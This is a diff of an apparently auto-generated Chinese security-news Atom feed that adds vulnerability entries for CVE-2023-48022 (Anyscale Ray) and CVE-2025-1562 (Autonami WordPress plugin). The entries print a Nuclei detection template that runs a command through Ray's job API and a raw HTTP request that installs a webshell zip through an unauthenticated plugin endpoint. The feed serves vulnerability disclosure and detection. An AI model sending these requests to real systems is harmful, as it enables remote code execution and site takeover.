@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-22T09:15:09.429Z</updated>
+  <updated>2025-06-22T09:45:31.787Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,87 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Anyscale Ray 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/22/github_975429504/"/>
+    <id>http://example.com/2025/06/22/github_975429504/</id>
+    <published>2025-06-22T09:45:31.790Z</published>
+    <updated>2025-06-22T09:45:31.787Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Anyscale Ray 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-48022</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Anyscale Ray 2.6.3和2.8.0版本中存在一个远程代码执行漏洞，由于作业提交API的不安全，攻击者如果能够访问Ray Dashboard API，就可以远程执行任意代码。</p><p><strong>产品厂商：</strong> Anyscale</p><p><strong>产品名称：</strong> Ray</p><p><strong>影响版本：</strong> 2.6.3, 2.8.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0523c0cf43cc19a356af7dcc7e60be08dfc50a49/http%2Fcves%2F2023%2FCVE-2023-48022.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0523c0cf43cc19a356af7dcc7e60be08dfc50a49/http%2Fcves%2F2023%2FCVE-2023-48022.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">48022</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Anyscale Ray <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> riteshs4hu<br>  <span class="hljs-params">description:</span> |<br>    Anyscale Ray <span class="hljs-number">2.6</span>.<span class="hljs-number">3</span> and <span class="hljs-number">2.8</span>.<span class="hljs-number">0</span> contain a remote code execution vulnerability due to insecure job submission API,<br>    allowing attackers to execute arbitrary code remotely <span class="hljs-keyword">if</span> they have network access to the Ray Dashboard API.<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//bishopfox.com/blog/ray-versions-2-6-3-2-8-0</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/497d7fb3b118</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/d3bafad9c9f6</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/0x656565/CVE-2023-48022</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">tags:</span> ray,rce,cve<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">jobid:</span> <span class="hljs-string">&quot;Job_&#123;&#123;rand_base(6)&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>jobs<span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<br>          <span class="hljs-string">&quot;entrypoint&quot;</span>: <span class="hljs-string">&quot;id&quot;</span>,<br>          <span class="hljs-string">&quot;submission_id&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;jobid&#125;&#125;&quot;</span><br>        &#125;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>        &#123;&#123;wait_for(<span class="hljs-number">8</span>)&#125;&#125;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>jobs<span class="hljs-operator">/</span>&#123;&#123;jobid&#125;&#125;<span class="hljs-symbol">/logs</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;gid=&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;users&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Anyscale Ray 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Anyscale Ray 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/22/github_4187889861/"/>
+    <id>http://example.com/2025/06/22/github_4187889861/</id>
+    <published>2025-06-22T09:45:22.861Z</published>
+    <updated>2025-06-22T09:45:22.859Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Anyscale Ray 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-48022</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Anyscale Ray 2.6.3和2.8.0版本中存在一个远程代码执行漏洞，由于不安全的作业提交API导致，允许远程攻击者执行任意代码。利用此漏洞需要网络访问API。</p><p><strong>产品厂商：</strong> Anyscale</p><p><strong>产品名称：</strong> Ray</p><p><strong>影响版本：</strong> 2.6.3, 2.8.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12451">https://github.com/projectdiscovery/nuclei-templates/issues/12451</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Anyscale Ray 2.6.3 and 2.8.0 contain a remote code execution caused by insecure job submission API, letting remote attackers execute arbitrary code, exploit requires network access to the API.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0">https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0</a></li><li><a href="https://vulncheck.com/xdb/497d7fb3b118">https://vulncheck.com/xdb/497d7fb3b118</a></li><li><a href="https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022">https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:jakabakos&#x2F;ShadowRay-RCE-PoC-CVE-2023-48022.git</li><li><a href="https://vulncheck.com/xdb/d3bafad9c9f6">https://vulncheck.com/xdb/d3bafad9c9f6</a></li><li><a href="https://github.com/0x656565/CVE-2023-48022">https://github.com/0x656565/CVE-2023-48022</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0x656565&#x2F;CVE-2023-48022.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Anyscale Ray 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Autonami App 未授权插件安装漏洞</title>
+    <link href="http://example.com/2025/06/22/github_958694451/"/>
+    <id>http://example.com/2025/06/22/github_958694451/</id>
+    <published>2025-06-22T09:45:14.155Z</published>
+    <updated>2025-06-22T09:45:14.155Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Autonami App 未授权插件安装漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-1562</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Autonami App存在一个未授权插件安装漏洞，攻击者可以通过发送特制的POST请求到&#x2F;index.php?rest_route&#x3D;%2Fautonami-app%2Fplugin%2Finstall_and_activate端点，尝试安装并激活恶意插件。由于无法直接获取插件路径，利用此漏洞的难度较大。</p><p><strong>产品名称：</strong> Autonami App</p><p><strong>来源：</strong> <a href="https://github.com/maximo896/CVE-2025-1562">https://github.com/maximo896/CVE-2025-1562</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-1562"><a href="#CVE-2025-1562" class="headerlink" title="CVE-2025-1562"></a>CVE-2025-1562</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?rest_route=%2Fautonami-app%2Fplugin%2Finstall_and_activate&amp;bwf-nonce=0f2449cddf9a7d692627071cfdef9ecf</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>wp.192.168.31.110.nip.io<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>117<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;install&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://github.com/maximo896/webshell-example/raw/refs/heads/main/suffer.zip&quot;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>无权限激活插件，无法直接获取到插件路径，利用难度大<br>unable to activate evil plugin, unable to retrieve the plugin path, difficult to attach</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Autonami App 未授权插件安装漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
   
   <entry>
     <title>Github Poc</title>
@@ -117,33 +198,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Anyscale Ray 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/22/github_4187889861/"/>
-    <id>http://example.com/2025/06/22/github_4187889861/</id>
-    <published>2025-06-22T02:45:18.741Z</published>
-    <updated>2025-06-22T02:45:18.739Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Anyscale Ray 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-48022</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Anyscale Ray 2.6.3和2.8.0版本中存在一个远程代码执行漏洞，由于不安全的作业提交API，允许远程攻击者执行任意代码。利用此漏洞需要网络访问API。</p><p><strong>产品厂商：</strong> Anyscale</p><p><strong>产品名称：</strong> Ray</p><p><strong>影响版本：</strong> 2.6.3, 2.8.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12451">https://github.com/projectdiscovery/nuclei-templates/issues/12451</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Anyscale Ray 2.6.3 and 2.8.0 contain a remote code execution caused by insecure job submission API, letting remote attackers execute arbitrary code, exploit requires network access to the API.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0">https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0</a></li><li><a href="https://vulncheck.com/xdb/497d7fb3b118">https://vulncheck.com/xdb/497d7fb3b118</a></li><li><a href="https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022">https://github.com/jakabakos/ShadowRay-RCE-PoC-CVE-2023-48022</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:jakabakos&#x2F;ShadowRay-RCE-PoC-CVE-2023-48022.git</li><li><a href="https://vulncheck.com/xdb/d3bafad9c9f6">https://vulncheck.com/xdb/d3bafad9c9f6</a></li><li><a href="https://github.com/0x656565/CVE-2023-48022">https://github.com/0x656565/CVE-2023-48022</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0x656565&#x2F;CVE-2023-48022.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Anyscale Ray 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -481,60 +535,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/v-1PplxirewVSHbPs1c5Iw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>《金融业智能风控实践白皮书》重磅发布，筑牢金融安全防线</title>
-    <link href="http://example.com/2025/06/21/weixin_1457011141/"/>
-    <id>http://example.com/2025/06/21/weixin_1457011141/</id>
-    <published>2025-06-21T12:18:08.392Z</published>
-    <updated>2025-06-21T12:18:08.388Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/NgRQ_-IB-4BvJ0gpEWvB9w">https://mp.weixin.qq.com/s/NgRQ_-IB-4BvJ0gpEWvB9w</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/NgRQ_-IB-4BvJ0gpEWvB9w&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ComfyUI遭C++后门攻击，700+ AI图像生成服务器沦陷</title>
-    <link href="http://example.com/2025/06/21/weixin_3682122920/"/>
-    <id>http://example.com/2025/06/21/weixin_3682122920/</id>
-    <published>2025-06-21T12:18:08.079Z</published>
-    <updated>2025-06-21T12:18:08.072Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ii7gCU56pm_t2auVXNh54Q">https://mp.weixin.qq.com/s/ii7gCU56pm_t2auVXNh54Q</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ii7gCU56pm_t2auVXNh54Q&quot;&gt;https://mp.weixin.q</summary>
       
     
     
